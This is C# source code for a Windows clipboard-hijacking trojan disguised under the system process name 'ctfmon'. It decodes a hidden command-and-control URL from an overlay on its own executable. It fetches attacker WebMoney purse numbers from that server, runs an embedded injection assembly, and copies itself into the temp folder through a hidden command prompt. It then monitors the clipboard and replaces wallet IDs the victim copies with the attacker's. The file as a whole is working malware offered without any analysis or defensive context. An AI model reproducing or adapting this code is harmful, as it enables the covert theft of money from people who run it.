using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ctfmon
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public Timer myTimer = new Timer();
        public Timer myChecker = new Timer();

        public string configUrl = "http://test015.zz.mu/testadm/11111111111/cfg.txt";
        public string configText = "";
        public int configChance = 50;
        public long TimeSpoynt = DateTime.Now.Ticks;
        public bool isChanse = false;

        public string RPurse = "R";
        public string EPurse = "E";
        public string ZPurse = "Z";
        public string UPurse = "U";
        public Random rand = new Random();
        public bool isOff = true;
        public int Refconnect = 1000;
        string pDataPurse = "";

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(String sClassName, String sAppName);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0,
                         SW_MAXIMIZE = 3,
                         SW_MINIMIZE = 6,
                         SW_RESTORE = 9,
                         SW_SHOW = 5,
                         SW_SHOWDEFAULT = 10,
                         SW_SHOWMAXIMIZED = 3,
                         SW_SHOWMINIMIZED = 2,
                         SW_SHOWMINNOACTIVE = 7,
                         SW_SHOWNA = 8,
                         SW_SHOWNOACTIVATE = 4,
                         SW_SHOWNORMAL = 1;

        protected void parsecfg()
        {
            try
            {
                WebClient web = new WebClient();
                configText = web.DownloadString(configUrl + "?mode=drone");

                XmlDocument doc = new XmlDocument();
                doc.LoadXml(configText);

                RPurse = "R" + doc.GetElementsByTagName("wmr")[0].InnerText;
                ZPurse = "Z" + doc.GetElementsByTagName("wmz")[0].InnerText;
                EPurse = "E" + doc.GetElementsByTagName("wme")[0].InnerText;
                UPurse = "U" + doc.GetElementsByTagName("wmu")[0].InnerText;
                isOff = Convert.ToBoolean(doc.GetElementsByTagName("off")[0].InnerText);
                configChance = Convert.ToInt32(doc.GetElementsByTagName("chance")[0].InnerText);
            }
            catch
            {

            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {


            string myCodeBase = File.ReadAllText(Application.ExecutablePath);
            string[] CodeAndOverlay = myCodeBase.Split(new string[] { "XMLK_SEP^^" }, StringSplitOptions.None);
            configUrl = Encoding.Default.GetString(Convert.FromBase64String(CodeAndOverlay[1]));
            

            try
            {
                WebClient web = new WebClient();
                configText = web.DownloadString(configUrl);
            }
            catch
            {

            }
            

            myTimer.Enabled = true;
            myTimer.Interval = Refconnect;
            myTimer.Tick += myTimer_Tick;
            myTimer.Start();

            myChecker.Enabled = true;
            myChecker.Interval = 1000;
            myChecker.Tick += myChecker_Tick;
            myChecker.Start();

            parsecfg();


            if (File.Exists(Path.GetTempPath() + "\\" + "ctfmon.exe") == false)
            {
                try
                {
                    //File.Copy(Application.ExecutablePath, Path.GetTempPath() + "\\" + "ctfmon.exe", true);
                    byte[] injCode;
                    injCode = Properties.Resources.Injection;
                    Assembly prepareInjection = Assembly.Load(injCode);
                    prepareInjection.EntryPoint.Invoke(null, null);
                    string regExecution = "echo 1 >"+ "\""+Path.GetTempPath()+"\\ctfmon.exe\" && xcopy \""+Application.ExecutablePath+"\" \""+Path.GetTempPath()+"\\ctfmon.exe\" /y";
                    ProcessStartInfo procStartInfo = new ProcessStartInfo();
                    procStartInfo.FileName = "cmd.exe";
                    procStartInfo.Arguments = "/c "+regExecution +"&& pause";
                    procStartInfo.CreateNoWindow = true;
                    procStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    WebClient web = new WebClient();
                    web.DownloadString(configUrl + "?mode=new_drone");

                    Process.Start(procStartInfo);
                }
                catch(Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        void myChecker_Tick(object sender, EventArgs e)
        {
            if (isOff == true)
            {   
                string data = Clipboard.GetText();
                if (Regex.IsMatch(data, "R[0-9]+", RegexOptions.IgnoreCase)  && Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                {
                    if (Regex.IsMatch(data,"R"+RPurse,RegexOptions.IgnoreCase))
                    {
                            MessageBox.Show(pDataPurse);
                            data = pDataPurse;
                            Clipboard.SetText(data);
                    }
                    else
                    {
                            if (Regex.IsMatch(data, "r") == true)
                            {
                                Clipboard.SetText(data.Replace(Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value, RPurse.ToLower()));
                                pDataPurse = data;
                            }
                            else
                            {
                                Clipboard.SetText(data.Replace(Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value, RPurse));
                                pDataPurse = data;
                            }
                    }
                }

                if (Regex.IsMatch(data, "U[0-9]+", RegexOptions.IgnoreCase) && data != UPurse && Regex.Match(data, "U[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                {
                    if (data == RPurse)
                    {
                        if (rand.Next(0, 100) < configChance)
                        {
                            data = pDataPurse;
                            Clipboard.SetText(data);
                        }
                    }
                    else
                    {
                        if (rand.Next(0, 100) < configChance)
                        {
                            if (Regex.IsMatch(data, "u") == true)
                            {
                                Clipboard.SetText(data.Replace(Regex.Match(data, "U[0-9]+", RegexOptions.IgnoreCase).Value, UPurse.ToLower()));
                            }
                            else
                            {
                                Clipboard.SetText(data.Replace(Regex.Match(data, "U[0-9]+", RegexOptions.IgnoreCase).Value, UPurse));
                            }
                        }
                    }
                }

                if (Regex.IsMatch(data, "Z[0-9]+", RegexOptions.IgnoreCase) && data != ZPurse && Regex.Match(data, "Z[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                {
                    if (data == RPurse)
                    {
                        if (rand.Next(0, 100) < configChance)
                        {
                            data = pDataPurse;
                            Clipboard.SetText(data);
                        }
                    }
                    else
                    {
                        if (rand.Next(0, 100) < configChance)
                        {
                            if (Regex.IsMatch(data, "z") == true)
                            {
                                Clipboard.SetText(data.Replace(Regex.Match(data, "Z[0-9]+", RegexOptions.IgnoreCase).Value, ZPurse.ToLower()));
                            }
                            else
                            {
                                Clipboard.SetText(data.Replace(Regex.Match(data, "Z[0-9]+", RegexOptions.IgnoreCase).Value, ZPurse));
                            }
                        }
                    }
                }

                if (Regex.IsMatch(data, "E[0-9]+", RegexOptions.IgnoreCase) && data != EPurse && Regex.Match(data, "E[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                {
                    if (data == RPurse)
                    {
                        if (rand.Next(0, 100) < configChance)
                        {
                            data = pDataPurse;
                            Clipboard.SetText(data);
                        }
                    }
                    else
                    {
                        if (rand.Next(0, 100) < configChance)
                        {
                            if (Regex.IsMatch(data, "e") == true)
                            {
                                Clipboard.SetText(data.Replace(Regex.Match(data, "E[0-9]+", RegexOptions.IgnoreCase).Value, EPurse.ToLower()));
                            }
                            else
                            {
                                Clipboard.SetText(data.Replace(Regex.Match(data, "E[0-9]+", RegexOptions.IgnoreCase).Value, EPurse));
                            }
                        }
                    }
                }

            }
            
        }

        void myTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                parsecfg();
            }
            catch
            {

            }
            
        }
    }
}
